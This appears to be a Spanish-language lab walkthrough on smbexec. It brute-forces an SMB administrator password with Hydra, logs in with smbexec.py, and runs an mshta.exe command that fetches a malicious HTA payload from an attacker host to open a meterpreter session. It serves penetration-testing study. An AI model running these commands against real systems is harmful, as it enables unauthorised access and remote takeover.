
Se trata de una herramienta usada para la ejecución de comandos de forma remota para sistemas windows tipicamente con privilegios de administrador usando SMB. Similar a la función de PsExec.

Diferencias con PsExec:

1. No creo un Servicio Temporal

Ejemplo de uso:

Tenemos de ip objetivo la 10.2.23.140

![[Pasted image 20250227090122.png]]

Vamos a intentar realizar un ataque de fuerza bruta al SMB

```bash
hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.2.23.140 smb2
```

![[Pasted image 20250227091212.png]]

Tenemos usuario Administrator con passwd carolina. Ahora vamos a conectarnos con SMBexec.

```bash
smbexec.py administrator:carolina@10.2.23.140
```

![[Pasted image 20250227091529.png]]

Me he dado cuenta de que la conexión por SMBexec es límitada pero podemos tratar de conseguir una sesión de meterpreter. Para ello vamos a utilizar el módulo de hta_server.

![[Pasted image 20250227092131.png]]

Esto nos generara un link malicioso:

```bash
http://10.10.41.3:8080/tvR44KsXgch4A.hta
```

El comando en la máquina víctima es:

```
mshta.exe http://10.10.41.3:8080/tvR44KsXgch4A.hta
```

![[Pasted image 20250227092545.png]]

Aquí vemos como se ha creado la sesión correspondiente en meterpreter.





